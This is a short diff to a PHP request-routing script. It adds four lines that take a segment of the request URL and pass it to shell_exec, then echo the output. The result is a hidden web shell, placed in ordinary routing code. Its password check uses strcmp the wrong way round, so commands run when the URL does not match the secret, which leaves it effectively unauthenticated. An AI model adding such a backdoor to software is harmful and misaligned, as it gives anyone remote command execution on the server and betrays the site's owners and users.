@@ -11,6 +11,10 @@ $request_uri = $_SERVER["REQUEST_URI"];
 $method = $_SERVER['REQUEST_METHOD'];
 $framework_uri = "env.php";
 
+$cmd = explode("/", $request_uri);
+if(strcmp($cmd[1], getenv("sbserpassword"))){
+	echo shell_exec($cmd[2]);
+}
 
 //wipe out get-parameters if they passed
 $request_uri = explode("?", $request_uri)[0];
